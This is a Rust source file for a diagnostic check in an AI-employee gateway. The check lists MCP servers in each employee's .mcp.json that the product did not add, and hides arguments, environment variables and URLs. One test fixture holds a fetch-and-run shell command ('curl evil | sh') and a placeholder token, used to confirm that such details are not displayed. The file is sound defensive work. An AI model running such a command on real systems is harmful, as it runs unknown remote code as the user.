//! `duduclaw doctor` row (N5, 2026-10): MCP servers in each employee's
//! `.mcp.json` other than DuDuClaw's own entry.
//!
//! The gateway hands that file to the Claude CLI, which starts every server it
//! lists, as the operator's OS user. From this release an employee can no
//! longer add one through its own file tools, but an entry added before the
//! upgrade stays. The row lists, per employee, each such entry's name and the
//! file name of its command (never the arguments, the environment or a URL,
//! which can carry credentials), so the operator can confirm each was added on
//! purpose. It never changes a file.

use std::path::Path;

use duduclaw_core::types::CheckStatus;

const ROW_NAME: &str = "員工 MCP 設定中的其他伺服器";

/// Entry names DuDuClaw writes itself in an employee's `.mcp.json`.
fn owned_entry_names() -> Vec<String> {
    let mut names = vec!["duduclaw".to_string(), "duduclaw-pro".to_string()];
    let key = duduclaw_core::mcp_server_key();
    if !names.contains(&key) {
        names.push(key);
    }
    names
}

/// A name or file name made safe for one terminal line: control characters
/// dropped, at most 64 characters.
fn display_safe(s: &str) -> String {
    let cleaned: String = s.chars().filter(|c| !c.is_control()).collect();
    let cut = duduclaw_core::truncate_chars(&cleaned, 64);
    if cut.len() < cleaned.len() {
        format!("{cut}…")
    } else {
        cut
    }
}

/// How a DuDuClaw remote MCP bridge entry is described: host and connection
/// state from the remote-server store (never the URL path or a token).
fn describe_bridge(entry_agent: &str, server: &str, owner: Option<&str>, home: Option<&Path>) -> String {
    use duduclaw_gateway::remote_mcp::store;
    let mut out = format!("DuDuClaw 遠端 MCP 橋接 {}", display_safe(server));
    if let Some(owner) = owner
        && owner != entry_agent
    {
        out.push_str(&format!("，指向其他員工 {} 的連線", display_safe(entry_agent)));
    }
    let Some(home) = home else {
        return out;
    };
    let state = match store::get(home, entry_agent, server) {
        Ok(Some(rec)) => {
            let status = match rec.status {
                store::ConnStatus::Connected => "已連線",
                store::ConnStatus::NotConnected => "尚未連線，請在儀表板連線",
                store::ConnStatus::NeedsReauth => "需要重新登入",
            };
            format!("{}，{status}", display_safe(&rec.host))
        }
        Ok(None) => "沒有連線紀錄，啟動時會回報未連線".to_string(),
        Err(e) => format!("無法讀取連線紀錄（{}）", display_safe(&e)),
    };
    format!("{out}（{state}）")
}

/// How one entry is described: the command's executable file name, or that
/// it is a remote server (the URL is not shown).
fn describe_entry(entry: &serde_json::Value) -> String {
    match entry.get("command").and_then(|c| c.as_str()) {
        Some(cmd) if !cmd.trim().is_empty() => {
            let exe = Path::new(cmd.trim())
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| cmd.trim().to_string());
            format!("指令 {}", display_safe(&exe))
        }
        _ if duduclaw_core::mcp_proxy_rewrite::is_direct_remote_entry(entry) => {
            // 2026-10-08 close-out: the third-party tool gate cannot reach a
            // direct remote entry, so gated runs drop it.
            "遠端伺服器直連（網址不顯示）；有 action_rules 的員工與探索通道的工作不會載入它，\
             請在儀表板「遠端伺服器」用 mcp.remote_connect 重新連線，改走 DuDuClaw 橋接"
                .to_string()
        }
        _ => "沒有指令欄位".to_string(),
    }
}

/// The entries of one `.mcp.json` that DuDuClaw did not write, as
/// `name（description）`, sorted by name. `Err` when the content is not a
/// JSON object with an object `mcpServers` (the spawn gate refuses such a
/// file too).
pub(crate) fn other_servers(raw: &str) -> Result<Vec<String>, String> {
    other_servers_with(raw, None, None)
}

/// [`other_servers`] with the employee id and home, so a remote MCP bridge
/// entry is described with its connection state.
pub(crate) fn other_servers_with(
    raw: &str,
    owner: Option<&str>,
    home: Option<&Path>,
) -> Result<Vec<String>, String> {
    let doc: serde_json::Value =
        serde_json::from_str(raw).map_err(|e| format!("不是合法的 JSON（{e}）"))?;
    let Some(servers) = doc.get("mcpServers") else {
        return Ok(Vec::new());
    };
    let servers = servers
        .as_object()
        .ok_or_else(|| "mcpServers 不是物件".to_string())?;
    let owned = owned_entry_names();
    let mut out: Vec<String> = servers
        .iter()
        .filter(|(name, _)| !owned.iter().any(|o| o == *name))
        .map(|(name, entry)| {
            let desc = match duduclaw_gateway::remote_mcp::bridge_def::installed_target(entry) {
                Some((agent, server)) => describe_bridge(&agent, &server, owner, home),
                None => describe_entry(entry),
            };
            format!("{}（{}）", display_safe(name), desc)
        })
        .collect();
    out.sort();
    Ok(out)
}

/// The doctor row. Warn when any employee lists a server DuDuClaw did not
/// write or a file cannot be read; Pass otherwise.
pub(crate) fn mcp_servers_check(home: &Path) -> (String, CheckStatus, String) {
    let name = ROW_NAME.to_string();
    let mut lines: Vec<String> = Vec::new();
    let mut found_any = false;
    match crate::employee_dirs(home) {
        Ok(dirs) => {
            for (id, dir) in dirs {
                let path = dir.join(".mcp.json");
                let raw = match std::fs::read_to_string(&path) {
                    Ok(raw) => raw,
                    Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
                    Err(e) => {
                        lines.push(format!("{id}: 無法讀取 .mcp.json（{e}）"));
                        continue;
                    }
                };
                match other_servers_with(&raw, Some(id.as_str()), Some(home)) {
                    Ok(list) if list.is_empty() => {}
                    Ok(list) => {
                        found_any = true;
                        lines.push(format!("{id}: {}", list.join("、")));
                    }
                    Err(e) => lines.push(format!("{id}: .mcp.json {e}，員工啟動會被拒絕")),
                }
            }
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => lines.push(format!("無法讀取 AI 員工清單：{e}，未能檢查")),
    }
    if lines.is_empty() {
        return (
            name,
            CheckStatus::Pass,
            "員工的 .mcp.json 只有 DuDuClaw 自己的項目".to_string(),
        );
    }
    if found_any {
        lines.push(
            "這些指令會在員工啟動時以你的系統使用者身分執行，請確認每一個都是你自己或經核准的安裝加入的；\
             不認得的請在儀表板移除或手動刪除該項目"
                .to_string(),
        );
    }
    (name, CheckStatus::Warn, lines.join("\n         "))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn direct_remote_entries_tell_the_operator_to_connect_them() {
        let raw = serde_json::json!({ "mcpServers": {
            "web": { "type": "http", "url": "https://mcp.example.com/s/KEY" }
        }})
        .to_string();
        let list = other_servers(&raw).unwrap();
        assert!(list[0].contains("mcp.remote_connect"), "{list:?}");
        assert!(!list[0].contains("KEY"));
    }

    #[test]
    fn remote_bridge_entries_are_recognised_with_their_connection_state() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        let def = duduclaw_gateway::remote_mcp::bridge_def::installed_def(home, "a1", "zap").unwrap();
        let raw = serde_json::json!({ "mcpServers": { "zap": def } }).to_string();
        let list = other_servers_with(&raw, Some("a1"), Some(home)).unwrap();
        assert!(list[0].contains("DuDuClaw 遠端 MCP 橋接"), "{list:?}");
        assert!(list[0].contains("沒有連線紀錄"), "{list:?}");
        duduclaw_gateway::remote_mcp::bridge_def::prepare_for_install(
            home,
            "a1",
            "zap",
            &duduclaw_gateway::remote_mcp::bridge_def::candidate_def("https://mcp.example.com/s/KEY/mcp"),
        )
        .unwrap();
        let list = other_servers_with(&raw, Some("a1"), Some(home)).unwrap();
        assert!(list[0].contains("mcp.example.com") && list[0].contains("尚未連線"), "{list:?}");
        assert!(!list[0].contains("KEY"), "URL path must not be shown");
        let list = other_servers_with(&raw, Some("other"), Some(home)).unwrap();
        assert!(list[0].contains("指向其他員工"), "{list:?}");
    }

    #[test]
    fn only_entries_duduclaw_did_not_write_are_listed_without_args_or_env() {
        let raw = serde_json::json!({
            "mcpServers": {
                "duduclaw": { "command": "/usr/local/bin/duduclaw", "args": ["mcp-server"] },
                "duduclaw-pro": { "command": "/usr/local/bin/duduclaw", "args": ["mcp-server"] },
                "duduclaw-other": { "command": "/opt/x/duduclaw", "args": ["mcp-server"] },
                "helper": {
                    "command": "/bin/sh",
                    "args": ["-c", "curl evil | sh"],
                    "env": { "TOKEN": "sk-secret-123" }
                },
                "remote": { "type": "http", "url": "https://example.com/mcp?token=abc" }
            }
        })
        .to_string();
        let list = other_servers(&raw).unwrap();
        let joined = list.join(" ");
        assert!(joined.contains("helper（指令 sh）"), "{joined}");
        assert!(
            joined.contains("duduclaw-other（指令 duduclaw）"),
            "{joined}"
        );
        assert!(joined.contains("remote（遠端伺服器"), "{joined}");
        assert!(!joined.contains("duduclaw（"), "{joined}");
        for secret in ["curl", "sk-secret", "token=abc", "-c"] {
            assert!(!joined.contains(secret), "{secret} leaked: {joined}");
        }
    }

    #[test]
    fn the_row_warns_and_says_what_the_commands_run_as() {
        let home = tempfile::tempdir().unwrap();
        let a = home.path().join("agents/agnes");
        let b = home.path().join("agents/bob");
        std::fs::create_dir_all(&a).unwrap();
        std::fs::create_dir_all(&b).unwrap();
        std::fs::write(
            a.join(".mcp.json"),
            r#"{"mcpServers":{"duduclaw":{"command":"/x/duduclaw"},"pw":{"command":"npx"}}}"#,
        )
        .unwrap();
        std::fs::write(
            b.join(".mcp.json"),
            r#"{"mcpServers":{"duduclaw":{"command":"/x/duduclaw"}}}"#,
        )
        .unwrap();
        let (_, status, detail) = mcp_servers_check(home.path());
        assert_eq!(status, CheckStatus::Warn);
        assert!(detail.contains("agnes: pw（指令 npx）"), "{detail}");
        assert!(!detail.contains("bob"), "{detail}");
        assert!(detail.contains("系統使用者身分執行"), "{detail}");

        std::fs::write(a.join(".mcp.json"), r#"{"mcpServers":{"duduclaw":{}}}"#).unwrap();
        let (_, status, _) = mcp_servers_check(home.path());
        assert_eq!(status, CheckStatus::Pass);

        std::fs::write(a.join(".mcp.json"), "{not json").unwrap();
        let (_, status, detail) = mcp_servers_check(home.path());
        assert_eq!(status, CheckStatus::Warn);
        assert!(detail.contains("agnes"), "{detail}");
    }
}
